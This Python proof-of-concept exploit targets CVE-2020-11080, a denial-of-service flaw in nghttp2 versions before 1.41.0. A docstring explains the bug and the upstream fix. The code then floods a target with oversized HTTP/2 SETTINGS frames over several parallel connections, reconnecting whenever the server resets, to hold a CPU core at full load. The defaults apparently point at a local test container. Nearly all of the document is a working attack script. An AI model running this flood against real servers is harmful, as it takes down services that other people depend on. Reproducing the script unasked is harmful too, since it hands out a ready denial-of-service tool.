#!/usr/bin/env python3
"""
PoC for CVE-2020-11080 - nghttp2 < 1.41.0 overly-large SETTINGS frame CPU DoS.

This is a resource-exhaustion denial of service (CWE-400 / CWE-707), NOT a
memory-corruption bug. ASan will NOT abort. The observable failure is the server
CPU pegging at ~100% on a core.

Mechanism: an HTTP/2 SETTINGS frame carries a list of (id, value) entries, each
6 bytes (2-byte id + 4-byte value). nghttp2 < 1.41.0 imposes no cap on the number
of entries, so a SETTINGS frame with a 14,400-byte payload (= 2400 entries) makes
the receiver iterate over all 2400 entries. Sending these frames in a tight loop
keeps the server core busy at ~100%. The fix (commit 336a98feb0) caps entries to
NGHTTP2_DEFAULT_MAX_SETTINGS (32) and returns ENHANCE_YOUR_CALM.

We speak h2c (cleartext HTTP/2), pre-auth: send the connection preface then flood
oversized SETTINGS frames. Framing is built manually.

Usage: poc_cve_2020_11080.py [host] [port] [duration_seconds] [connections]
       duration_seconds default 15; connections default 4 (parallel sockets).
"""
import socket
import struct
import sys
import threading
import time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
duration = float(sys.argv[3]) if len(sys.argv) > 3 else 15.0
n_conns = int(sys.argv[4]) if len(sys.argv) > 4 else 4

# HTTP/2 connection preface (RFC 7540 section 3.5)
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Build one oversized SETTINGS frame.
# 2400 entries * 6 bytes = 14400-byte payload.
N_ENTRIES = 2400
# Each entry: 2-byte identifier + 4-byte value. Use a harmless/unknown id (0x00ff)
# repeated; unknown SETTINGS ids must still be parsed (and ignored) per spec, so
# the receiver walks the whole list. Value is arbitrary.
entry = struct.pack(">HI", 0x00FF, 0x00000001)
payload = entry * N_ENTRIES
assert len(payload) == 14400, len(payload)

# HTTP/2 frame header: length(3 big-endian) + type(1) + flags(1) + stream id(4)
FRAME_TYPE_SETTINGS = 0x4
length = len(payload)
frame_header = bytes([(length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])
frame_header += bytes([FRAME_TYPE_SETTINGS])  # type
frame_header += bytes([0x00])  # flags (0 -> not ACK)
frame_header += struct.pack(">I", 0)  # stream id 0 (connection control stream)
SETTINGS_FRAME = frame_header + payload

stop = threading.Event()
counters = []


def flood(idx):
    sent = 0
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(PREFACE)
        # send our SETTINGS preface frame then flood oversized SETTINGS frames
        while not stop.is_set():
            try:
                s.sendall(SETTINGS_FRAME)
                sent += 1
            except OSError:
                # server may close/reset; reconnect to keep the pressure on
                try:
                    s.close()
                except OSError:
                    pass
                try:
                    s = socket.create_connection((host, port), timeout=5)
                    s.sendall(PREFACE)
                except OSError:
                    break
        try:
            s.close()
        except OSError:
            pass
    except OSError as e:
        print(f"[thread {idx}] connect error: {e}")
    counters.append(sent)


def main():
    print(f"[*] Target {host}:{port}  duration={duration}s  connections={n_conns}")
    print(f"[*] SETTINGS frame: {len(SETTINGS_FRAME)} bytes "
          f"({N_ENTRIES} entries, {len(payload)}-byte payload)")
    threads = [threading.Thread(target=flood, args=(i,), daemon=True)
               for i in range(n_conns)]
    t0 = time.time()
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    total = sum(counters)
    elapsed = time.time() - t0
    print(f"[*] Sent {total} oversized SETTINGS frames in {elapsed:.1f}s "
          f"({total / max(elapsed, 0.001):.0f}/s, "
          f"{total * len(SETTINGS_FRAME) / 1e6:.1f} MB).")
    print("[*] Done. Check `docker stats` during the flood for ~100% CPU.")


if __name__ == "__main__":
    main()
